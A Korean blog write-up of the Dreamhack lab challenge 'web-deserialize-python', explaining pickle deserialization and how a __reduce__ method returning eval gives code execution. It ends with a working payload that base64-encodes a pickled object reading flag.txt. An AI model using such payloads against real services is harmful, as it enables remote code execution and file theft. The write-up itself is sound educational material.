---
layout: single
title: "[Dreamhack] web-deserialize-python write-up"
date: 2024-12-26 22:12 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] web-deserialize-python

<br>

### 문제 설명

- Session Login이 구현된 서비스입니다.
- Python(pickle)의 Deserialize 취약점을 이용해 플래그를 획득하세요. 
- 플래그는 flag.txt 또는 FLAG 변수에 있습니다.

<br>

문제 사이트에 접속하면 세션 Create, Check 탭이 존재한다.

![{26300EC2-776C-4E23-A721-C5983BD1CB59}](/images/2024-12-26-web-deserialize-python/{26300EC2-776C-4E23-A721-C5983BD1CB59}.png)

<br>

Create 탭에 들어가서 만들기 전 쿠키를 확인해보면 아무것도 존재하지 않는다.

![{1969DCEC-48E6-4D65-963A-08A4DA837136}](/images/2024-12-26-web-deserialize-python/{1969DCEC-48E6-4D65-963A-08A4DA837136}.png)

<br>

Name, Userid, Password를 전부 guest 값으로 주고 Create 버튼을 누르니 세션을 만들어주었다.

![{E8E4940C-7CE5-4820-B0F8-4553F97A6B7E}](/images/2024-12-26-web-deserialize-python/{E8E4940C-7CE5-4820-B0F8-4553F97A6B7E}.png)

<br>
check 탭에서 세션을 확인해보면 아래와 같이 Name, Userid, Password에 넣었던 값들이 출력되는 것을 알 수 있다.

![{800EB43A-4FAD-4EBC-96C3-EDBD202E792E}](/images/2024-12-26-web-deserialize-python/{800EB43A-4FAD-4EBC-96C3-EDBD202E792E}.png)

<br>

파이썬 pickle 모듈은 객체 구조의 직렬화(serialization)와 역직렬화(deserialization)를 위해 사용하는데, 쉽게 말해 파이썬 객체를 저장하거나 전송하기 위해 변환하고, 다시 그 객체로 복원하는 데 사용되는 도구이다.  

직렬화를 하는 이유는 데이터를 파일/DB에 저장하거나 또는 세션에 걸쳐 프로그램 상태를 유지하거나, 네트워크를 통해 데이터를 전송하기 위해서이다. 

- serialize : 파이썬 객체 계층 구조 -> 바이트 스트림 = pickling
- deserialize: 바이트 스트림 -> 파이썬 객체 계층 구조 = unpickling

<br>

pickle 모듈은 다양한 메서드를 지원하는데, 이 중 `__reduce__()` 메서드에서 취약점이 발생할 수 있다고 한다. 

>  `__reduce__()` 메서드는 파이썬 객체 계층 구조를 역직렬화(unpickling)할 때 객체를 재구성하는 데 사용되는 튜플을 반환하는 메서드이다.

<br>

pickling된 바이트 스트림을 unpickle할 때 pickle 모듈은 먼저 original object의 인스턴스를 만들고 나서 그 인스턴스를 올바른 데이터로 채운다. 이를 위해서 바이트 스트림에는 original object 인스턴스에 특정된 데이터만을 포함한다.  

이때, unpickle을 성공적으로 하기 위해서 객체를 어떻게 재구성할지 정의하는 명령 피연산자와 명령어들이 포함되어 있어야 하는데, 이 명령 피연산자와 명령어들은 `__recude__()`메서드에서 반환되는 정보들이다.

<br>

`__reduce__()` 메서드의 리턴 값 (보통 2개)

- 호출 가능한 객체
- 호출 가능한 객체에 대한 인자. 호출 가능한 객체가 인자를 받아들이지 않으면 빈 튜플을 제공해야 한다.

> 이때, `__reduce__()` 메서드에서 호출 가능한 객체에 eval 또는 os와 같이 명령어를 실행할 수 있도록 클래스를 임의로 지정할 수 있다면, 이로 인해 RCE와 같은 보안 취약점이 발생할 수 있다.

<br>

이번 문제를 풀기 위해선 일단 세션이 어떻게 만들어지는지 보자. info 라는 변수에 {} 로 딕셔너리 형태로 name, userid, password 값이 들어가고 dumps 함수로 직렬화한 후에 이 바이트 스트림을 base64로 인코딩 해준다. 마지막으로는 utf8로 디코딩까지 해주는 걸 알 수 있다.

```python
INFO = ['name', 'userid', 'password']

@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)
```

<br>

위와 같은 로직으로만 세션을 만들어주면 문제 사이트의 /check_session 경로에서 데이터를 읽어와줄 것이다. 따라서 아래와 같이 `__reduce__()` 메소드를 이용해 ./flag.txt 파일을 읽는 코드를 만들고 eval 객체를 통해서 b 코드를 실행하는 세션을 만들어주면 flag 값을 획득할 수 있다.

```python
import os, pickle, base64

class a:
    def __reduce__(self):
        b = "open('./flag.txt').read()"
        return (eval, (b, ))

test = {'name': a()}

print(base64.b64encode(pickle.dumps(test)).decode('utf8'))
```

![{72A8F3F6-D35A-43AB-9BA1-991387F89606}](/images/2024-12-26-web-deserialize-python/{72A8F3F6-D35A-43AB-9BA1-991387F89606}.png)